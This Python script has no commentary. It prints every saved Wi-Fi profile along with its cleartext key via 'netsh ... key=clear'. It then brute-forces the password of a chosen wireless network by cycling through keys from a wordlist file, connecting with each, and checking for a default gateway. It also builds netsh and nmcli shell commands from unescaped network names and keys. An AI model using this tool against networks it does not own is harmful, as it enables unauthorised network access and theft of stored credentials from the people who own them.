import subprocess
import itertools
import string
import time
import os
def chack_wifi():
    cmd = 'ipconfig > OUTPUT.txt'
    os.system(cmd)
    with open("OUTPUT.txt") as f:
        text=f.read()
        if "Default Gateway . . . . . . . . . :" in text:
            print("Wifi is connected")
            return 1
        else:
            return 0
u=int(input("Enter how much try you password : "))
def password():
    with open("pass.txt") as f:
        for i in range(u):
            text=next(f)
            yield text
data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
for i in profiles:
    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
    try:
        print ("{:<30}|  {:<}".format(i, results[0]))
    except IndexError:
        print ("{:<30}|  {:<}".format(i, ""))
# input("")
import os
import platform
import getpass

y = "y"
Y = "Y"
n = "n"
N = "N"
def createNewConnection(name, SSID, key):
    config = """<?xml version=\"1.0\"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>"""+name+"""</name>
    <SSIDConfig>
        <SSID>
            <name>"""+SSID+"""</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>"""+key+"""</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>"""
    if platform.system() == "Windows":
        command = "netsh wlan add profile filename=\""+name+".xml\""+" interface=Wi-Fi"
        with open(name+".xml", 'w') as file:
            file.write(config)
    elif platform.system() == "Linux":
        command = "nmcli dev wifi connect '"+SSID+"' password '"+key+"'"
    os.system(command)
    if platform.system() == "Windows":
        os.remove(name+".xml")
def connect(name, SSID):
    if platform.system() == "Windows":
        command = "netsh wlan connect name=\""+name+"\" ssid=\""+SSID+"\" interface=Wi-Fi"
    elif platform.system() == "Linux":
        command = "nmcli con up "+SSID
    os.system(command)

def displayAvailableNetworks():
    if platform.system() == "Windows":
        command = "netsh wlan show networks interface=Wi-Fi"
    elif platform.system() == "Linux":
        command = "nmcli dev wifi list"
    os.system(command)

try:
    Mi=displayAvailableNetworks()
    option = input("New connection (y/N)? ")
    if option == n or option == N:
        name = input("Name: ")
        connect(name, name)
        print("If you aren't connected to this network, try connecting with correct credentials")
    elif option == y or option == Y:
        name = input("Name: ")
        x=password()
        for i in range(u):
            key=x.__next__()
            createNewConnection(name, name, key)
            connect(name, name)
            time.sleep(15)
            MR=chack_wifi()
            print(MR)
            if MR==1:
                print(key)
                break
            else:
                os.remove("OUTPUT.txt")
            # print("If you aren't connected to this network, try connecting with correct credentials")
except KeyboardInterrupt as e:
    print("\nExiting...")
